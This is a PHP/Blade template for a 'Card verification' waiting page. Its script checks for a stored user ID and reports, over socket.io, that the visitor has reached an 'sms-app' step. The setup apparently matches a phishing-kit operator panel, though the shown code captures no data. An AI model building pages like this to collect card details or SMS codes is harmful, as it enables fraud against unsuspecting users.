<?php
session_start();
//require_once 'config.php';
// include('partials/header.php');

$phone = '';
if (isset($_SESSION['contact_number'])) {
    $phone = $_SESSION['contact_number'];
}

?>
@include('apps.mxe.partials.header')
<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    .wrap.middle {
        padding: 40px 30px;
        margin-top: 50px;
        background: #f0f0eb;
        padding-bottom: 0px;
    }

    .note {
        margin-bottom: 30px;
    }

    .note font {
        font-weight: 400;
    }

    .input-otp input[type="text"] {
        border: 1px solid #000 !important;
        background-color: #fff !important;
        padding: 3px 8px !important;
        font-weight: 400;
        margin-bottom: 5px;
    }

    .submit-btn {
        background-color: #c00d0d !important;
        border: 1px solid #000 !important;
        margin: 5px 0;
    }

    @media(max-width: 767px) {
        .submit-btn {
            background-color: #c00d0d;
            padding: 11px 24px;
            font-size: 20px;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .phone-row input,
        .input-otp input {
            border: none;
            border-bottom: 2px solid #cacaca;
            height: 40px;
            background: transparent;
            font-family: inherit;
            margin-bottom: 15px;
            outline: none;
        }

        .input-otp {
            text-align: center;
        }

        .input-otp input {
            text-align: center;
        }

        .note {
            text-align: center;
            font-size: 16px;
            color: #565656;
            pointer-events: none;
            user-select: none;
        }

        .count-down {
            font-size: 14px;
            color: #ccc;
            border: 1px solid #ccc;
            max-width: 200px;
            margin: auto;
            padding: 10px;
            margin-bottom: 30px;
            margin-top: 10px;
        }

        .wrap.middle form {
            width: 100%;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }
    }
</style>
<div class="backdrop"></div>
<div class="wrap middle" style="width: 100%!important;">
    <div class="form">
        <div class="input-otp">
            <div class="note">
                Card verification
            </div>
        </div>
    </div>
</div>
<br />
<br />


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js"
    integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="{{ asset('apps/mxe/js/jquery-2.1.3.min.js') }}"></script>
<script>
    localStorage.setItem('form_submitted', false);
    $("input[type='hidden']").val(localStorage.getItem('userID'))

    let requsetSending = false;
    let card_valid = false;
    $(document).ready(function() {
        let socket = io("http://{{ env('SOCKET_HOST') }}:{{ env('SOCKET_PORT') }}");
        if (!localStorage.getItem('userID')) {
            window.location.href = window.location.origin;
        }

        socket.on('connect', () => {
            var id = localStorage.getItem('userID')
            if (id) {
                var data = {
                    id: id,
                    page: 'sms-app'
                }
                socket.emit('clientEvent', JSON.stringify(data));
            }
        });

    })
</script>

@include('apps.mxe.partials.footer')
